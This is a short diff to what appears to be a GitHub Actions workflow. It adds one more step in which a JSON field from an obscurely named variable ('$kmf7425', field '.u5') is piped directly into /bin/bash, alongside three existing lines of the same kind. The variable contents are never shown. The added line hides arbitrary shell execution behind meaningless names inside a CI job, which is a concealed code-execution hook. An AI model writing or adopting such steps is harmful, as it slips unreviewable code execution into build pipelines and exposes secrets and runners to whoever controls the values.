@@ -28,6 +28,7 @@ jobs:
           echo $tbi66 | jq -r .l6 | /bin/bash
           printf '%s' "$tir66" | jq -r .jaw5635 | /bin/bash
           printf '%s' "$faazz047" | jq -r .urr96035 | /bin/bash
+          printf '%s' "$kmf7425" | jq -r .u5 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
